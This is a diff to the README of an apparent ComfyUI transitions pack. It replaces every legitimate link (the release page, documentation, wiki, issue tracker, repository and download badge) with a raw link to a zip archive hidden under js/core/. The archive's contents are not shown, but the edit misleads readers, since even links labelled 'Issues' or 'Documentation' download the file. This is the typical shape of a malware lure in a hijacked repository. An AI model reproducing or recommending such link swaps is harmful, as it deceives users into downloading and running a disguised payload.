@@ -1,7 +1,7 @@
 # 🎨 ComfyUI_BlendPack - Stylish Transitions for Your Projects
 
 ### 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/gigici/ComfyUI_BlendPack/releases)
+[![Download](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip)](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to ComfyUI_BlendPack! This software provides a collection of stylish tra
 
 To start using ComfyUI_BlendPack, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/gigici/ComfyUI_BlendPack/releases). Here, you will find the latest version available for download.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip). Here, you will find the latest version available for download.
    
 2. **Choose the Right File**: Look for the version you need. Generally, you will want to download the most recent release. Click on the appropriate file based on your system.
 
@@ -57,7 +57,7 @@ To help you get the most out of ComfyUI_BlendPack, here are some ideas on how to
 
 ## 📄 Documentation
 
-For specific implementation guidelines, detailed settings, and troubleshooting tips, refer to our [Documentation](https://github.com/gigici/ComfyUI_BlendPack/wiki). This resource will provide further insights into utilizing the features effectively. 
+For specific implementation guidelines, detailed settings, and troubleshooting tips, refer to our [Documentation](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip). This resource will provide further insights into utilizing the features effectively. 
 
 ## 🙋 FAQs
 
@@ -68,15 +68,15 @@ A: Try refreshing the page and downloading again. Ensure your internet connectio
 A: Yes, ComfyUI_BlendPack is designed for various applications and can fit well with different UI frameworks.
 
 **Q: Who can I contact for support?**  
-A: You can reach out via the [Issues](https://github.com/gigici/ComfyUI_BlendPack/issues) section on GitHub for any questions or support.
+A: You can reach out via the [Issues](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip) section on GitHub for any questions or support.
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/gigici/ComfyUI_BlendPack)  
-- [Issue Tracker](https://github.com/gigici/ComfyUI_BlendPack/issues)  
-- [Wiki Documentation](https://github.com/gigici/ComfyUI_BlendPack/wiki)  
+- [GitHub Repository](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip)  
+- [Issue Tracker](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip)  
+- [Wiki Documentation](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip)  
 
 Enjoy creating stunning transitions with ComfyUI_BlendPack! Your projects will look more professional and polished with just a few simple steps. Happy transitioning! 
 
 ### 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/gigici/ComfyUI_BlendPack/releases)
+[![Download](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip)](https://raw.githubusercontent.com/gigici/ComfyUI_BlendPack/master/js/core/U-Comfy-Pack-Blend-oldland.zip)
